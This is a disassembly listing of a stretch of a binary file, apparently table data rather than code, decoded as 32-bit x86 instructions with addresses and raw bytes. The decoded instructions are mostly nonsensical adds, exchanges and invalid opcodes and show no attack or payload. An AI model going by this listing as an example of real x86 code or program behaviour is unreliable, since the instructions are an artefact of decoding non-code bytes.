  406385:	00 ad 02 94 00 10    	add    %ch,0x10009402(%ebp)
  40638b:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  40638e:	00 00                	add    %al,(%eax)
  406390:	00 00                	add    %al,(%eax)
  406392:	96                   	xchg   %eax,%esi
  406393:	00 ce                	add    %cl,%dh
  406395:	04 58                	add    $0x58,%al
  406397:	00 11                	add    %dl,(%ecx)
  406399:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	00 96 00 91 19 9a    	add    %dl,-0x65e66f00(%esi)
  4063a5:	00 12                	add    %dl,(%edx)
  4063a7:	00 c8                	add    %cl,%al
  4063a9:	30 00                	xor    %al,(%eax)
  4063ab:	00 00                	add    %al,(%eax)
  4063ad:	00 91 00 08 0d 9a    	add    %dl,-0x65f2f800(%ecx)
  4063b3:	00 13                	add    %dl,(%ebx)
  4063b5:	00 35 21 00 00 00    	add    %dh,0x21
  4063bb:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  4063c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063c4:	10 31                	adc    %dh,(%ecx)
  4063c6:	00 00                	add    %al,(%eax)
  4063c8:	00 00                	add    %al,(%eax)
  4063ca:	96                   	xchg   %eax,%esi
  4063cb:	00 15 0f 0a 00 14    	add    %dl,0x14000a0f
  4063d1:	00 78 20             	add    %bh,0x20(%eax)
  4063d4:	00 00                	add    %al,(%eax)
  4063d6:	00 00                	add    %al,(%eax)
  4063d8:	86 18                	xchg   %bl,(%eax)
  4063da:	09 15 0e 00 14 00    	or     %edx,0x14000e
  4063e0:	41                   	inc    %ecx
  4063e1:	21 00                	and    %eax,(%eax)
  4063e3:	00 00                	add    %al,(%eax)
  4063e5:	00 96 00 47 17 0a    	add    %dl,0xa174700(%esi)
  4063eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063ee:	f8                   	clc
  4063ef:	33 00                	xor    (%eax),%eax
  4063f1:	00 00                	add    %al,(%eax)
  4063f3:	00 91 00 64 0e 1d    	add    %dl,0x1d0e6400(%ecx)
  4063f9:	00 14 00             	add    %dl,(%eax,%eax,1)
  4063fc:	50                   	push   %eax
  4063fd:	34 00                	xor    $0x0,%al
  4063ff:	00 00                	add    %al,(%eax)
  406401:	00 91 00 70 02 1d    	add    %dl,0x1d027000(%ecx)
  406407:	00 14 00             	add    %dl,(%eax,%eax,1)
  40640a:	a0 34 00 00 00       	mov    0x34,%al
  40640f:	00 91 00 53 14 1d    	add    %dl,0x1d145300(%ecx)
  406415:	00 14 00             	add    %dl,(%eax,%eax,1)
  406418:	dc 35 00 00 00 00    	fdivl  0x0
  40641e:	91                   	xchg   %eax,%ecx
  40641f:	00 ef                	add    %ch,%bh
  406421:	13 1d 00 14 00 20    	adc    0x20001400,%ebx
  406427:	36 00 00             	add    %al,%ss:(%eax)
  40642a:	00 00                	add    %al,(%eax)
  40642c:	91                   	xchg   %eax,%ecx
  40642d:	00 8f 05 1d 00 14    	add    %cl,0x14001d05(%edi)
  406433:	00 78 20             	add    %bh,0x20(%eax)
  406436:	00 00                	add    %al,(%eax)
  406438:	00 00                	add    %al,(%eax)
  40643a:	86 18                	xchg   %bl,(%eax)
  40643c:	09 15 0e 00 14 00    	or     %edx,0x14000e
  406442:	6c                   	insb   (%dx),%es:(%edi)
  406443:	36 00 00             	add    %al,%ss:(%eax)
  406446:	00 00                	add    %al,(%eax)
  406448:	96                   	xchg   %eax,%esi
  406449:	00 f9                	add    %bh,%cl
  40644b:	01 c3                	add    %eax,%ebx
  40644d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406450:	f0 36 00 00          	lock add %al,%ss:(%eax)
  406454:	00 00                	add    %al,(%eax)
  406456:	96                   	xchg   %eax,%esi
  406457:	00 37                	add    %dh,(%edi)
  406459:	0d c7 00 14 00       	or     $0x1400c7,%eax
  40645e:	5c                   	pop    %esp
  40645f:	37                   	aaa
  406460:	00 00                	add    %al,(%eax)
  406462:	00 00                	add    %al,(%eax)
  406464:	96                   	xchg   %eax,%esi
  406465:	00 1c 12             	add    %bl,(%edx,%edx,1)
  406468:	53                   	push   %ebx
  406469:	00 15 00 7b 21 00    	add    %dl,0x217b00
  40646f:	00 00                	add    %al,(%eax)
  406471:	00 96 00 df 10 1d    	add    %dl,0x1d10df00(%esi)
  406477:	00 15 00 18 39 00    	add    %dl,0x391800
  40647d:	00 00                	add    %al,(%eax)
  40647f:	00 96 00 ef 19 0a    	add    %dl,0xa19ef00(%esi)
  406485:	00 15 00 90 39 00    	add    %dl,0x399000
  40648b:	00 00                	add    %al,(%eax)
  40648d:	00 96 00 bb 18 c3    	add    %dl,-0x3ce74500(%esi)
  406493:	00 15 00 7c 3a 00    	add    %dl,0x3a7c00
  406499:	00 00                	add    %al,(%eax)
  40649b:	00 96 00 8b 13 d5    	add    %dl,-0x2aec7500(%esi)
  4064a1:	00 15 00 c4 3a 00    	add    %dl,0x3ac400
  4064a7:	00 00                	add    %al,(%eax)
  4064a9:	00 96 00 81 12 0a    	add    %dl,0xa128100(%esi)
  4064af:	00 16                	add    %dl,(%esi)
  4064b1:	00 f8                	add    %bh,%al
  4064b3:	3a 00                	cmp    (%eax),%al
  4064b5:	00 00                	add    %al,(%eax)
  4064b7:	00 96 00 97 06 c3    	add    %dl,-0x3cf96900(%esi)
  4064bd:	00 16                	add    %dl,(%esi)
  4064bf:	00 54 3b 00          	add    %dl,0x0(%ebx,%edi,1)
  4064c3:	00 00                	add    %al,(%eax)
  4064c5:	00 96 00 40 1c 1d    	add    %dl,0x1d1c4000(%esi)
  4064cb:	00 16                	add    %dl,(%esi)
  4064cd:	00 91 21 00 00 00    	add    %dl,0x21(%ecx)
  4064d3:	00 96 00 35 1c 0a    	add    %dl,0xa1c3500(%esi)
  4064d9:	00 16                	add    %dl,(%esi)
  4064db:	00 00                	add    %al,(%eax)
  4064dd:	00 00                	add    %al,(%eax)
  4064df:	00 80 00 96 20 08    	add    %al,0x8209600(%eax)
  4064e5:	1c e0                	sbb    $0xe0,%al
  4064e7:	00 16                	add    %dl,(%esi)
  4064e9:	00 00                	add    %al,(%eax)
  4064eb:	00 00                	add    %al,(%eax)
  4064ed:	00 80 00 96 20 f3    	add    %al,-0xcdf6a00(%eax)
  4064f3:	1b e4                	sbb    %esp,%esp
  4064f5:	00 16                	add    %dl,(%esi)
  4064f7:	00 00                	add    %al,(%eax)
  4064f9:	00 00                	add    %al,(%eax)
  4064fb:	00 80 00 96 20 f0    	add    %al,-0xfdf6a00(%eax)
  406501:	05 ec 00 19 00       	add    $0x1900ec,%eax
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	80 00 96             	addb   $0x96,(%eax)
  40650d:	20 09                	and    %cl,(%ecx)
  40650f:	1b f1                	sbb    %ecx,%esi
  406511:	00 1a                	add    %bl,(%edx)
  406513:	00 00                	add    %al,(%eax)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 80 00 96 20 c4    	add    %al,-0x3bdf6a00(%eax)
  40651d:	08 f8                	or     %bh,%al
  40651f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406522:	00 00                	add    %al,(%eax)
  406524:	00 00                	add    %al,(%eax)
  406526:	80 00 96             	addb   $0x96,(%eax)
  406529:	20 86 0e ff 00 1d    	and    %al,0x1d00ff0e(%esi)
  40652f:	00 ad 21 00 00 00    	add    %ch,0x21(%ebp)
  406535:	00 96 00 cf 0b 1c    	add    %dl,0x1c0bcf00(%esi)
  40653b:	01 20                	add    %esp,(%eax)
  40653d:	00 74 3b 00          	add    %dh,0x0(%ebx,%edi,1)
  406541:	00 00                	add    %al,(%eax)
  406543:	00 96 00 71 19 0a    	add    %dl,0xa197100(%esi)
  406549:	00 22                	add    %ah,(%edx)
  40654b:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  406552:	96                   	xchg   %eax,%esi
  406553:	00 f7                	add    %dh,%bh
  406555:	19 0a                	sbb    %ecx,(%edx)
  406557:	00 22                	add    %ah,(%edx)
  406559:	00 f4                	add    %dh,%ah
  40655b:	3b 00                	cmp    (%eax),%eax
  40655d:	00 00                	add    %al,(%eax)
  40655f:	00 96 00 c2 0a 23    	add    %dl,0x230ac200(%esi)
  406565:	01 22                	add    %esp,(%edx)
  406567:	00 60 3c             	add    %ah,0x3c(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	96                   	xchg   %eax,%esi
  40656f:	00 b9 0a 2a 01 24    	add    %bh,0x24012a0a(%ecx)
  406575:	00 cc                	add    %cl,%ah
  406577:	3c 00                	cmp    $0x0,%al
  406579:	00 00                	add    %al,(%eax)
  40657b:	00 96 00 a2 0a 84    	add    %dl,-0x7bf55e00(%esi)
  406581:	00 25 00 34 3d 00    	add    %ah,0x3d3400
  406587:	00 00                	add    %al,(%eax)
  406589:	00 96 00 b6 1c 1d    	add    %dl,0x1d1cb600(%esi)
  40658f:	00 26                	add    %ah,(%esi)
  406591:	00 cd                	add    %cl,%ch
  406593:	21 00                	and    %eax,(%eax)
  406595:	00 00                	add    %al,(%eax)
  406597:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  40659d:	00 26                	add    %ah,(%esi)
  40659f:	00 a0 3d 00 00 00    	add    %ah,0x3d(%eax)
  4065a5:	00 96 00 16 03 9a    	add    %dl,-0x65fcea00(%esi)
  4065ab:	00 26                	add    %ah,(%esi)
  4065ad:	00 dc                	add    %bl,%ah
  4065af:	3f                   	aas
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	00 00                	add    %al,(%eax)
  4065b4:	91                   	xchg   %eax,%ecx
  4065b5:	00 9f 05 38 01 27    	add    %bl,0x27013805(%edi)
  4065bb:	00 e3                	add    %ah,%bl
  4065bd:	21 00                	and    %eax,(%eax)
  4065bf:	00 00                	add    %al,(%eax)
  4065c1:	00 91 00 6c 03 0a    	add    %dl,0xa036c00(%ecx)
  4065c7:	00 28                	add    %ch,(%eax)
  4065c9:	00 13                	add    %dl,(%ebx)
  4065cb:	22 00                	and    (%eax),%al
  4065cd:	00 00                	add    %al,(%eax)
  4065cf:	00 96 00 a5 14 3e    	add    %dl,0x3e14a500(%esi)
  4065d5:	01 28                	add    %ebp,(%eax)
  4065d7:	00 4a 22             	add    %cl,0x22(%edx)
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	00 00                	add    %al,(%eax)
  4065de:	91                   	xchg   %eax,%ecx
  4065df:	18 0f                	sbb    %cl,(%edi)
  4065e1:	15 0a 00 29 00       	adc    $0x29000a,%eax
  4065e6:	fc                   	cld
  4065e7:	40                   	inc    %eax
  4065e8:	00 00                	add    %al,(%eax)
  4065ea:	00 00                	add    %al,(%eax)
  4065ec:	86 18                	xchg   %bl,(%eax)
  4065ee:	09 15 6b 01 29 00    	or     %edx,0x29016b
  4065f4:	56                   	push   %esi
  4065f5:	22 00                	and    (%eax),%al
  4065f7:	00 00                	add    %al,(%eax)
  4065f9:	00 86 00 80 1b 70    	add    %al,0x701b8000(%esi)
  4065ff:	01 2a                	add    %ebp,(%edx)
  406601:	00 74 41 00          	add    %dh,0x0(%ecx,%eax,2)
  406605:	00 00                	add    %al,(%eax)
  406607:	00 86 00 80 1b 75    	add    %al,0x751b8000(%esi)
  40660d:	01 2b                	add    %ebp,(%ebx)
  40660f:	00 6e 22             	add    %ch,0x22(%esi)
  406612:	00 00                	add    %al,(%eax)
  406614:	00 00                	add    %al,(%eax)
  406616:	86 00                	xchg   %al,(%eax)
  406618:	78 1b                	js     0x406635
  40661a:	70 01                	jo     0x40661d
  40661c:	2c 00                	sub    $0x0,%al
  40661e:	cc                   	int3
  40661f:	42                   	inc    %edx
  406620:	00 00                	add    %al,(%eax)
  406622:	00 00                	add    %al,(%eax)
  406624:	86 00                	xchg   %al,(%eax)
  406626:	78 1b                	js     0x406643
  406628:	75 01                	jne    0x40662b
  40662a:	2d 00 8c 44 00       	sub    $0x448c00,%eax
  40662f:	00 48 00             	add    %cl,0x0(%eax)
  406632:	81 00 eb 0e 7c 01    	addl   $0x17c0eeb,(%eax)
  406638:	2e 00 86 22 00 00 00 	add    %al,%cs:0x22(%esi)
  40663f:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  406645:	00 30                	add    %dh,(%eax)
  406647:	00 bc 44 00 00 00 00 	add    %bh,0x0(%esp,%eax,2)
  40664e:	96                   	xchg   %eax,%esi
  40664f:	00 21                	add    %ah,(%ecx)
  406651:	0d c7 00 30 00       	or     $0x3000c7,%eax
  406656:	48                   	dec    %eax
  406657:	45                   	inc    %ebp
  406658:	00 00                	add    %al,(%eax)
  40665a:	00 00                	add    %al,(%eax)
  40665c:	96                   	xchg   %eax,%esi
  40665d:	00 21                	add    %ah,(%ecx)
  40665f:	0d 84 01 31 00       	or     $0x310184,%eax
  406664:	9f                   	lahf
  406665:	22 00                	and    (%eax),%al
  406667:	00 00                	add    %al,(%eax)
  406669:	00 96 00 46 16 2a    	add    %dl,0x2a164600(%esi)
  40666f:	01 32                	add    %esi,(%edx)
  406671:	00 ac 22 00 00 00 00 	add    %ch,0x0(%edx,%eiz,1)
  406678:	96                   	xchg   %eax,%esi
  406679:	00 b7 0c 93 01 33    	add    %dh,0x3301930c(%edi)
  40667f:	00 88 45 00 00 00    	add    %cl,0x45(%eax)
  406685:	00 96 00 91 0c 93    	add    %dl,-0x6cf36f00(%esi)
  40668b:	01 34 00             	add    %esi,(%eax,%eax,1)
  40668e:	d0 45 00             	rolb   $1,0x0(%ebp)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 96 00 c1 0c 93    	add    %dl,-0x6cf33f00(%esi)
  406699:	01 35 00 18 46 00    	add    %esi,0x461800
  40669f:	00 00                	add    %al,(%eax)
  4066a1:	00 96 00 8d 16 84    	add    %dl,-0x7be97300(%esi)
  4066a7:	01 36                	add    %esi,(%esi)
  4066a9:	00 b9 22 00 00 00    	add    %bh,0x22(%ecx)
  4066af:	00 96 00 e0 00 99    	add    %dl,-0x66ff2000(%esi)
  4066b5:	01 37                	add    %esi,(%edi)
  4066b7:	00 c6                	add    %al,%dh
  4066b9:	22 00                	and    (%eax),%al
  4066bb:	00 00                	add    %al,(%eax)
  4066bd:	00 96 00 76 00 9f    	add    %dl,-0x60ff8a00(%esi)
  4066c3:	01 38                	add    %edi,(%eax)
  4066c5:	00 ea                	add    %ch,%dl
  4066c7:	22 00                	and    (%eax),%al
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	00 96 00 fb 00 a5    	add    %dl,-0x5aff0500(%esi)
  4066d1:	01 39                	add    %edi,(%ecx)
  4066d3:	00 fe                	add    %bh,%dh
  4066d5:	22 00                	and    (%eax),%al
  4066d7:	00 00                	add    %al,(%eax)
  4066d9:	00 96 00 c7 05 ab    	add    %dl,-0x54fa3900(%esi)
  4066df:	01 3a                	add    %edi,(%edx)
  4066e1:	00 78 20             	add    %bh,0x20(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	00 00                	add    %al,(%eax)
  4066e8:	86 18                	xchg   %bl,(%eax)
  4066ea:	09 15 0e 00 3b 00    	or     %edx,0x3b000e
  4066f0:	0b 23                	or     (%ebx),%esp
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	00 00                	add    %al,(%eax)
  4066f6:	91                   	xchg   %eax,%ecx
  4066f7:	18 0f                	sbb    %cl,(%edi)
  4066f9:	15 0a 00 3b 00       	adc    $0x3b000a,%eax
  4066fe:	17                   	pop    %ss
  4066ff:	23 00                	and    (%eax),%eax
  406701:	00 00                	add    %al,(%eax)
  406703:	00 86 18 09 15 b1    	add    %al,-0x4eeaf6e8(%esi)
  406709:	01 3b                	add    %edi,(%ebx)
  40670b:	00 2d 23 00 00 00    	add    %ch,0x23
  406711:	00 e1                	add    %ah,%cl
  406713:	09 d3                	or     %edx,%ebx
  406715:	1a bb 01 3c 00 40    	sbb    0x40003c01(%ebx),%bh
  40671b:	23 00                	and    (%eax),%eax
  40671d:	00 00                	add    %al,(%eax)
  40671f:	00 e1                	add    %ah,%cl
  406721:	01 bf 1b bf 01 3c    	add    %edi,0x3c01bf1b(%edi)
  406727:	00 63 23             	add    %ah,0x23(%ebx)
  40672a:	00 00                	add    %al,(%eax)
  40672c:	00 00                	add    %al,(%eax)
  40672e:	e1 01                	loope  0x406731
  406730:	ae                   	scas   %es:(%edi),%al
  406731:	19 0e                	sbb    %ecx,(%esi)
  406733:	00 3c 00             	add    %bh,(%eax,%eax,1)
  406736:	6c                   	insb   (%dx),%es:(%edi)
  406737:	23 00                	and    (%eax),%eax
  406739:	00 00                	add    %al,(%eax)
  40673b:	00 86 18 09 15 cb    	add    %al,-0x34eaf6e8(%esi)
  406741:	01 3c 00             	add    %edi,(%eax,%eax,1)
  406744:	82 23 00             	andb   $0x0,(%ebx)
  406747:	00 00                	add    %al,(%eax)
  406749:	00 86 00 2c 03 d7    	add    %al,-0x28fcd400(%esi)
  40674f:	01 3e                	add    %edi,(%esi)
  406751:	00 8f 23 00 00 00    	add    %cl,0x23(%edi)
  406757:	00 86 00 2c 03 dc    	add    %al,-0x23fcd400(%esi)
  40675d:	01 3e                	add    %edi,(%esi)
  40675f:	00 a3 23 00 00 00    	add    %ah,0x23(%ebx)
  406765:	00 86 00 2c 03 e2    	add    %al,-0x1dfcd400(%esi)
  40676b:	01 3f                	add    %edi,(%edi)
  40676d:	00 b7 23 00 00 00    	add    %dh,0x23(%edi)
  406773:	00 86 00 2c 03 e8    	add    %al,-0x17fcd400(%esi)
  406779:	01 40 00             	add    %eax,0x0(%eax)
  40677c:	cb                   	lret
  40677d:	23 00                	and    (%eax),%eax
  40677f:	00 00                	add    %al,(%eax)
  406781:	00 86 08 d9 0f ee    	add    %al,-0x11f026f8(%esi)
  406787:	01 41 00             	add    %eax,0x0(%ecx)
  40678a:	d9 23                	fldenv (%ebx)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	00 00                	add    %al,(%eax)
  406790:	86 08                	xchg   %cl,(%eax)
  406792:	85 0d f4 01 42 00    	test   %ecx,0x4201f4
  406798:	e6 23                	out    %al,$0x23
  40679a:	00 00                	add    %al,(%eax)
  40679c:	00 00                	add    %al,(%eax)
  40679e:	81 00 96 07 6b 01    	addl   $0x16b0796,(%eax)
  4067a4:	42                   	inc    %edx
  4067a5:	00 50 46             	add    %dl,0x46(%eax)
  4067a8:	00 00                	add    %al,(%eax)
  4067aa:	00 00                	add    %al,(%eax)
  4067ac:	81 00 ce 12 0e 00    	addl   $0xe12ce,(%eax)
  4067b2:	43                   	inc    %ebx
  4067b3:	00 94 46 00 00 00 00 	add    %dl,0x0(%esi,%eax,2)
  4067ba:	81 00 27 03 d7 01    	addl   $0x1d70327,(%eax)
  4067c0:	43                   	inc    %ebx
  4067c1:	00 bc 46 00 00 00 00 	add    %bh,0x0(%esi,%eax,2)
  4067c8:	81 00 71 0b 0a 02    	addl   $0x20a0b71,(%eax)
  4067ce:	43                   	inc    %ebx
  4067cf:	00 38                	add    %bh,(%eax)
  4067d1:	47                   	inc    %edi
  4067d2:	00 00                	add    %al,(%eax)
  4067d4:	00 00                	add    %al,(%eax)
  4067d6:	86 00                	xchg   %al,(%eax)
  4067d8:	18 19                	sbb    %bl,(%ecx)
  4067da:	dc 01                	faddl  (%ecx)
  4067dc:	44                   	inc    %esp
  4067dd:	00 00                	add    %al,(%eax)
  4067df:	24 00                	and    $0x0,%al
  4067e1:	00 00                	add    %al,(%eax)
  4067e3:	00 81 00 a5 04 d7    	add    %al,-0x28fb5b00(%ecx)
  4067e9:	01 45 00             	add    %eax,0x0(%ebp)
  4067ec:	21 24 00             	and    %esp,(%eax,%eax,1)
  4067ef:	00 00                	add    %al,(%eax)
  4067f1:	00 81 00 b6 04 d7    	add    %al,-0x28fb4a00(%ecx)
  4067f7:	01 45 00             	add    %eax,0x0(%ebp)
  4067fa:	42                   	inc    %edx
  4067fb:	24 00                	and    $0x0,%al
  4067fd:	00 00                	add    %al,(%eax)
  4067ff:	00 86 00 bb 04 d7    	add    %al,-0x28fb4500(%esi)
  406805:	01 45 00             	add    %eax,0x0(%ebp)
  406808:	64 47                	fs inc %edi
  40680a:	00 00                	add    %al,(%eax)
  40680c:	00 00                	add    %al,(%eax)
  40680e:	81 00 78 12 0f 02    	addl   $0x20f1278,(%eax)
  406814:	45                   	inc    %ebp
  406815:	00 2c 48             	add    %ch,(%eax,%ecx,2)
  406818:	00 00                	add    %al,(%eax)
  40681a:	00 00                	add    %al,(%eax)
  40681c:	81 00 52 1c 0f 02    	addl   $0x20f1c52,(%eax)
  406822:	46                   	inc    %esi
  406823:	00 4a 24             	add    %cl,0x24(%edx)
  406826:	00 00                	add    %al,(%eax)
  406828:	00 00                	add    %al,(%eax)
  40682a:	86 00                	xchg   %al,(%eax)
  40682c:	e2 13                	loop   0x406841
  40682e:	15 02 47 00 5f       	adc    $0x5f004702,%eax
  406833:	24 00                	and    $0x0,%al
  406835:	00 00                	add    %al,(%eax)
  406837:	00 86 00 cc 00 1a    	add    %al,0x1a00cc00(%esi)
  40683d:	02 48 00             	add    0x0(%eax),%cl
  406840:	e0 48                	loopne 0x40688a
  406842:	00 00                	add    %al,(%eax)
  406844:	00 00                	add    %al,(%eax)
  406846:	86 00                	xchg   %al,(%eax)
  406848:	c0 00 1f             	rolb   $0x1f,(%eax)
  40684b:	02 49 00             	add    0x0(%ecx),%cl
  40684e:	88 49 00             	mov    %cl,0x0(%ecx)
  406851:	00 00                	add    %al,(%eax)
  406853:	00 86 00 d5 13 23    	add    %al,0x2313d500(%esi)
  406859:	02 49 00             	add    0x0(%ecx),%cl
  40685c:	30 4a 00             	xor    %cl,0x0(%edx)
  40685f:	00 00                	add    %al,(%eax)
  406861:	00 86 00 02 19 27    	add    %al,0x27190200(%esi)
  406867:	02 49 00             	add    0x0(%ecx),%cl
  40686a:	74 24                	je     0x406890
  40686c:	00 00                	add    %al,(%eax)
  40686e:	00 00                	add    %al,(%eax)
  406870:	86 00                	xchg   %al,(%eax)
  406872:	b2 16                	mov    $0x16,%dl
  406874:	2b 02                	sub    (%edx),%eax
  406876:	49                   	dec    %ecx
  406877:	00 c4                	add    %al,%ah
  406879:	4a                   	dec    %edx
  40687a:	00 00                	add    %al,(%eax)
  40687c:	00 00                	add    %al,(%eax)
  40687e:	86 00                	xchg   %al,(%eax)
  406880:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406881:	16                   	push   %ss
  406882:	31 02                	xor    %eax,(%edx)
  406884:	4a                   	dec    %edx
  406885:	00 85 24 00 00 00    	add    %al,0x24(%ebp)
  40688b:	00 86 00 2c 03 36    	add    %al,0x36032c00(%esi)
  406891:	02 4a 00             	add    0x0(%edx),%cl
  406894:	9a 24 00 00 00 00 86 	lcall  $0x8600,$0x24
  40689b:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  40689e:	3c 02                	cmp    $0x2,%al
  4068a0:	4c                   	dec    %esp
  4068a1:	00 74 4b 00          	add    %dh,0x0(%ebx,%ecx,2)
  4068a5:	00 00                	add    %al,(%eax)
  4068a7:	00 86 00 97 16 42    	add    %al,0x42169700(%esi)
  4068ad:	02 4e 00             	add    0x0(%esi),%cl
  4068b0:	cc                   	int3
  4068b1:	4b                   	dec    %ebx
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	00 00                	add    %al,(%eax)
  4068b6:	86 00                	xchg   %al,(%eax)
  4068b8:	6b 06 42             	imul   $0x42,(%esi),%eax
  4068bb:	02 4f 00             	add    0x0(%edi),%cl
  4068be:	18 4c 00 00          	sbb    %cl,0x0(%eax,%eax,1)
  4068c2:	00 00                	add    %al,(%eax)
  4068c4:	86 00                	xchg   %al,(%eax)
  4068c6:	38 19                	cmp    %bl,(%ecx)
  4068c8:	dc 01                	faddl  (%ecx)
  4068ca:	50                   	push   %eax
  4068cb:	00 b0 24 00 00 00    	add    %dh,0x24(%eax)
  4068d1:	00 86 00 53 0f 0e    	add    %al,0xe0f5300(%esi)
  4068d7:	00 51 00             	add    %dl,0x0(%ecx)
  4068da:	c6                   	(bad)
  4068db:	24 00                	and    $0x0,%al
  4068dd:	00 00                	add    %al,(%eax)
  4068df:	00 86 00 ab 0c 6b    	add    %al,0x6b0cab00(%esi)
  4068e5:	01 51 00             	add    %edx,0x0(%ecx)
  4068e8:	d6                   	salc
  4068e9:	24 00                	and    $0x0,%al
  4068eb:	00 00                	add    %al,(%eax)
  4068ed:	00 86 00 9f 0c 47    	add    %al,0x470c9f00(%esi)
  4068f3:	02 52 00             	add    0x0(%edx),%dl
  4068f6:	f4                   	hlt
  4068f7:	24 00                	and    $0x0,%al
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 86 00 83 10 4b    	add    %al,0x4b108300(%esi)
  406901:	02 52 00             	add    0x0(%edx),%dl
  406904:	09 25 00 00 00 00    	or     %esp,0x0
  40690a:	86 00                	xchg   %al,(%eax)
  40690c:	44                   	inc    %esp
  40690d:	06                   	push   %es
  40690e:	50                   	push   %eax
  40690f:	02 53 00             	add    0x0(%ebx),%dl
  406912:	1f                   	pop    %ds
  406913:	25 00 00 00 00       	and    $0x0,%eax
  406918:	86 00                	xchg   %al,(%eax)
  40691a:	0d 19 55 02 54       	or     $0x54025519,%eax
  40691f:	00 d4                	add    %dl,%ah
  406921:	4c                   	dec    %esp
  406922:	00 00                	add    %al,(%eax)
  406924:	00 00                	add    %al,(%eax)
  406926:	86 00                	xchg   %al,(%eax)
  406928:	7d 16                	jge    0x406940
  40692a:	2b 02                	sub    (%edx),%eax
  40692c:	55                   	push   %ebp
  40692d:	00 2c 4d 00 00 00 00 	add    %ch,0x0(,%ecx,2)
  406934:	86 00                	xchg   %al,(%eax)
  406936:	5c                   	pop    %esp
  406937:	06                   	push   %es
  406938:	6b 01 56             	imul   $0x56,(%ecx),%eax
  40693b:	00 50 4d             	add    %dl,0x4d(%eax)
  40693e:	00 00                	add    %al,(%eax)
  406940:	00 00                	add    %al,(%eax)
  406942:	86 00                	xchg   %al,(%eax)
  406944:	9b                   	fwait
  406945:	0f                   	(bad)
  406946:	0f 02 57 00          	lar    0x0(%edi),%edx
  40694a:	64 53                	fs push %ebx
  40694c:	00 00                	add    %al,(%eax)
  40694e:	00 00                	add    %al,(%eax)
  406950:	86 00                	xchg   %al,(%eax)
  406952:	39 16                	cmp    %edx,(%esi)
  406954:	31 02                	xor    %eax,(%edx)
  406956:	58                   	pop    %eax
  406957:	00 d0                	add    %dl,%al
  406959:	53                   	push   %ebx
  40695a:	00 00                	add    %al,(%eax)
  40695c:	00 00                	add    %al,(%eax)
  40695e:	86 00                	xchg   %al,(%eax)
  406960:	6a 0f                	push   $0xf
  406962:	0f 02 58 00          	lar    0x0(%eax),%ebx
  406966:	34 25                	xor    $0x25,%al
  406968:	00 00                	add    %al,(%eax)
  40696a:	00 00                	add    %al,(%eax)
  40696c:	86 08                	xchg   %cl,(%eax)
  40696e:	77 0c                	ja     0x40697c
  406970:	47                   	inc    %edi
  406971:	02 59 00             	add    0x0(%ecx),%bl
  406974:	3c 25                	cmp    $0x25,%al
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	86 08                	xchg   %cl,(%eax)
  40697c:	84 0c 6b             	test   %cl,(%ebx,%ebp,2)
  40697f:	01 59 00             	add    %ebx,0x0(%ecx)
  406982:	45                   	inc    %ebp
  406983:	25 00 00 00 00       	and    $0x0,%eax
  406988:	86 08                	xchg   %cl,(%eax)
  40698a:	b9 13 23 02 5a       	mov    $0x5a022313,%ecx
  40698f:	00 4d 25             	add    %cl,0x25(%ebp)
  406992:	00 00                	add    %al,(%eax)
  406994:	00 00                	add    %al,(%eax)
  406996:	86 08                	xchg   %cl,(%eax)
  406998:	c7                   	(bad)
  406999:	13 15 02 5a 00 56    	adc    0x56005a02,%edx
  40699f:	25 00 00 00 00       	and    $0x0,%eax
  4069a4:	86 08                	xchg   %cl,(%eax)
  4069a6:	ea 18 27 02 5b 00 5e 	ljmp   $0x5e00,$0x5b022718
  4069ad:	25 00 00 00 00       	and    $0x0,%eax
  4069b2:	86 08                	xchg   %cl,(%eax)
  4069b4:	f6 18                	negb   (%eax)
  4069b6:	55                   	push   %ebp
  4069b7:	02 5b 00             	add    0x0(%ebx),%bl
  4069ba:	c8 54 00 00          	enter  $0x54,$0x0
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	86 08                	xchg   %cl,(%eax)
  4069c2:	82 1c 5a 02          	sbbb   $0x2,(%edx,%ebx,2)
  4069c6:	5c                   	pop    %esp
  4069c7:	00 67 25             	add    %ah,0x25(%edi)
  4069ca:	00 00                	add    %al,(%eax)
  4069cc:	00 00                	add    %al,(%eax)
  4069ce:	86 08                	xchg   %cl,(%eax)
  4069d0:	fe 07                	incb   (%edi)
  4069d2:	5f                   	pop    %edi
  4069d3:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069d7:	25 00 00 00 00       	and    $0x0,%eax
  4069dc:	e1 01                	loope  0x4069df
  4069de:	d2 14 64             	rclb   %cl,(%esp,%eiz,2)
  4069e1:	02 5c 00 7c          	add    0x7c(%eax,%eax,1),%bl
  4069e5:	25 00 00 00 00       	and    $0x0,%eax
  4069ea:	86 18                	xchg   %bl,(%eax)
  4069ec:	09 15 0e 00 5c 00    	or     %edx,0x5c000e
  4069f2:	28 55 00             	sub    %dl,0x0(%ebp)
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	00 96 00 48 0c b1    	add    %dl,-0x4ef3b800(%esi)
  4069fd:	02 5c 00 8f          	add    -0x71(%eax,%eax,1),%bl
